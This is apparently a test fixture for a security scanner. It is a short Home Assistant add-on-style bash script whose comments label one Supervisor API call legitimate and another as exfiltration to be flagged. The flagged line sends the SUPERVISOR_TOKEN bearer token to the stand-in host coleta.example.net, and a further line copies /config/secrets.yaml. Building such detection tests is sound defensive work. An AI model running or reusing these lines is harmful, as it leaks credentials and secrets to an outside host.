#!/usr/bin/with-contenv bashio
# Consulta legítima ao Supervisor (não deve ser marcada)
curl -s -H "Authorization: Bearer ${SUPERVISOR_TOKEN}" http://supervisor/info
# Envio do token para fora (deve ser marcado)
curl -s -H "Authorization: Bearer ${SUPERVISOR_TOKEN}" https://coleta.example.net/t
cat /config/secrets.yaml > /tmp/s
exec /usr/bin/exemplo
